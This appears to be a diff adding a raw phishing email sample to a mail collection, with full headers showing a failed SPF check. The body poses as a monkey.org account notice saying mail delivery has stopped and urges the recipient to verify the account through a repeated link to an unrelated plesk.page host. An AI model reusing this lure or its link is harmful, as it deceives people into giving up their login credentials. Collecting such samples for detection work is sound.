@@ -1,0 +1,199 @@
+Return-Path: ContactUs@Geomedia.ca
+Delivered-To: jose@monkey.org
+X-FDA: 78584627814.37.0F1C6C2
+Received: from mta0.geomedia.ca (unknown [143.198.38.68])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id 4BF788416347
+	for <jose@monkey.org>; Tue, 14 Sep 2021 02:41:27 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
+ d=geomedia.ca; h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=ContactUs@Geomedia.ca;
+ bh=zci+CfyLuIjzuAcSuvZ8Td0cZfvIyWDiiv5IcADJgbk=; =?utf-8?q?b=3DmcCNzdOomIa6?=
+ =?utf-8?q?O81U2xIK4r3nxezmAVWfEH8rn77hlZfph1otclpcyIzFHVNvCN3Ec8X+lIPqhzPh?=
+  
+ FjSlThvtiz0r7r6NgExve0kKfCnB0hVNAw0g2rA7IT9NlT48ldt46XDUPQvAS1oXv6ARIaisS59O
+   KvdjWIArMgM2UE+t2yM=
+From: monkey.org  <ContactUs@Geomedia.ca>
+To: jose@monkey.org
+Subject: jose@monkey.org have stopped processing incoming emails.
+Date: 14 Sep 2021 02:22:15 +0000
+Message-ID: <20210914022215.C1B87CA6E358DB42@Geomedia.ca>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam01
+X-Rspamd-Queue-Id: 4BF788416347
+X-Stat-Signature: yg8qxt4zg6zpr7ez7b57yxc1jjjhhkfi
+X-Spam-Status: No, score=8.60
+Authentication-Results: imf29.b.hostedemail.com;	dkim=none ("invalid DKIM
+ record") header.d=geomedia.ca header.s=default header.b=mcCNzdOo;	dmarc=none;
+	spf=fail (imf29.b.hostedemail.com: domain of ContactUs@Geomedia.ca does not
+ designate 143.198.38.68 as permitted sender)
+ smtp.mailfrom=ContactUs@Geomedia.ca
+X-HE-Tag: 1631587287-486672
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 73
+
+<tbody>
+  <tr>
+    <td>
+=20=20=20=20=20=20
+      <table style=3D"max-width: 640px; margin: 0 auto" width=3D"100%" cell=
+spacing=3D"0" cellpadding=3D"0" border=3D"0" bgcolor=3D"#ffffff" align=3D"c=
+enter">
+        <tbody>
+        <tr>
+          <td colspan=3D"3" width=3D"100%" height=3D"45" bgcolor=3D"#ffdc00=
+"></td>
+        </tr>
+        <tr>
+          <td width=3D"6%" height=3D"25" bgcolor=3D"#ffdc00"></td>
+          <td width=3D"88%" height=3D"25" bgcolor=3D"#ffdc00">
+            <img src=3D"" alt=3D"monkey.org" style=3D"display: block" width=
+=3D"204" height=3D"25" border=3D"0">
+          </td>
+          <td width=3D"6%" height=3D"25" bgcolor=3D"#ffdc00"></td>
+        </tr>
+        <tr>
+          <td colspan=3D"3" width=3D"100%" height=3D"45" bgcolor=3D"#ffdc00=
+"></td>
+        </tr>
+        <tr>
+          <td colspan=3D"3" width=3D"100%" height=3D"35"></td>
+        </tr>
+        <tr>
+  <td width=3D"6%"></td>
+  <td style=3D"font-size: 18px; line-height: 22px; font-family: Apple SD Go=
+thic Neo,sans-serif,'????',Malgun Gothic,'??',gulim; letter-spacing: -1px; =
+font-weight: bold; color: #1e1e1e" width=3D"88%">We have stopped processing=
+ incoming emails</td>
+  <td width=3D"6%"></td>
+</tr>
+<tr>
+  <td colspan=3D"3" width=3D"100%" height=3D"25"></td>
+</tr>
+<tr>
+  <td width=3D"6%"></td>
+  <td style=3D"font-size: 14px; line-height: 22px; font-family: Apple SD Go=
+thic Neo,sans-serif,'????',Malgun Gothic,'??',gulim; letter-spacing: -1px; =
+color: #1e1e1e" width=3D"88%">You are required to verify your account.</td>=
+
+  <td width=3D"6%"></td>
+</tr>
+<tr>
+  <td width=3D"6%"></td>
+  <td style=3D"font-size: 14px; line-height: 22px; font-family: Apple SD Go=
+thic Neo,sans-serif,'????',Malgun Gothic,'??',gulim; letter-spacing: -1px; =
+color: #1e1e1e" width=3D"88%">You may not use some services if you do not v=
+erify your account.</td>
+  <td width=3D"6%"></td>
+</tr>
+<tr>
+  <td colspan=3D"3" width=3D"100%" height=3D"18"></td>
+</tr>
+<tr>
+  <td width=3D"6%"></td>
+  <td width=3D"88%">
+    <table style=3D"line-height: 22px; font-family: Apple SD Gothic Neo,san=
+s-serif,'????',Malgun Gothic,'??',gulim; letter-spacing: -1px; color: #1e1e=
+1e" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
+      <tbody>
+      <tr>
+        <td colspan=3D"5" width=3D"100%" height=3D"1" bgcolor=3D"#bebebe"><=
+/td>
+      </tr>
+      <tr>
+        <td colspan=3D"5" width=3D"100%" height=3D"25"></td>
+      </tr>
+      <tr>
+        <td width=3D"3%"></td>
+        <th style=3D"font-size: 14px; font-weight: normal" width=3D"22%" va=
+lign=3D"top" align=3D"left">Email Account</th>
+        <td width=3D"2%"></td>
+        <td style=3D"font-size: 14px; font-weight: bold; word-break: break-=
+all" width=3D"70%" valign=3D"top">jose@monkey.org</td>
+        <td width=3D"3%"></td>
+      </tr>
+      <tr>
+        <td colspan=3D"5" width=3D"100%" height=3D"8"></td>
+      </tr>
+      <tr>
+        <td width=3D"3%"></td>
+        <th style=3D"font-size: 14px; font-weight: normal" width=3D"22%" va=
+lign=3D"top" align=3D"left">Date</th>
+        <td width=3D"2%"></td>
+        <td style=3D"font-size: 14px; font-weight: bold; word-break: break-=
+all" width=3D"70%" valign=3D"top">9/14/2021 2:22:15 a.m.</td>
+        <td width=3D"3%"></td>
+      </tr>
+      <tr>
+        <td colspan=3D"5" width=3D"100%" height=3D"27"></td>
+      </tr>
+      <tr>
+        <td colspan=3D"5" width=3D"100%" height=3D"1" bgcolor=3D"#bebebe"><=
+/td>
+      </tr>
+      </tbody>
+    </table>
+  </td>
+  <td width=3D"6%"></td>
+</tr>
+<tr>
+  <td colspan=3D"3" width=3D"100%" height=3D"24"></td>
+</tr>
+<tr>
+  <td width=3D"6%"></td>
+  <td style=3D"font-size: 14px; line-height: 22px; font-family: Apple SD Go=
+thic Neo,sans-serif,'????',Malgun Gothic,'??',gulim; letter-spacing: -1px; =
+color: #1e1e1e" width=3D"88%">
+    We need you to verify your account now, please click=20
+    <a href=3D"https://nice-noyce.137-184-24-144.plesk.page/update/index.ph=
+p?i=3Di&0=3Djose@monkey.org" style=3D"color: #3c64e6; text-decoration: none=
+" target=3D"_blank" rel=3D"noreferrer">here </a>.
+    <p style=3D"padding: 0; margin: 0; color: #767676">
+      <a style=3D"font-size: 14px; font-weight: normal; color: #3d7dca; tex=
+t-underline-position: below" href=3D"https://nice-noyce.137-184-24-144.ples=
+k.page/update/index.php?i=3Di&0=3Djose@monkey.org" target=3D"_blank" rel=3D=
+"noreferrer"></a>
+    </p>
+  </td>
+  <td width=3D"6%"></td>
+<tr>
+  <td colspan=3D"3" width=3D"100%" height=3D"58"></td>
+</tr>
+
+        <tr>
+          <td colspan=3D"3" width=3D"100%" height=3D"1" bgcolor=3D"#e6e6e6"=
+></td>
+        </tr>
+        <tr>
+          <td colspan=3D"3" width=3D"100%" height=3D"16"></td>
+        </tr>
+        <tr>
+          <td width=3D"6%"></td>
+          <td style=3D"font-size: 12px; line-height: 18px; font-family: App=
+le SD Gothic Neo,sans-serif,'????',Malgun Gothic,'??',Dotum; letter-spacing=
+: -1px; color: #767676" width=3D"88%">
+=20=20=20=20=20=20=20=20=20=20=20=20
+            Copyright=A9 <a href=3D"https://nice-noyce.137-184-24-144.plesk=
+=2Epage/update/index.php?i=3Di&0=3Djose@monkey.org" style=3D"color: #767676=
+; text-decoration: none" target=3D"_blank" rel=3D"noreferrer">monkey.org</a=
+>
+          </td>
+          <td width=3D"6%"></td>
+        </tr>
+        <tr>
+          <td colspan=3D"3" width=3D"100%" height=3D"18"></td>
+        </tr>
+=20=20=20=20=20=20=20=20
+        </tbody>
+      </table>
+    </td>
+  </tr>
+  <tr>
+    <td width=3D"100%" height=3D"100"></td>
+  </tr>
+  </tbody>
+
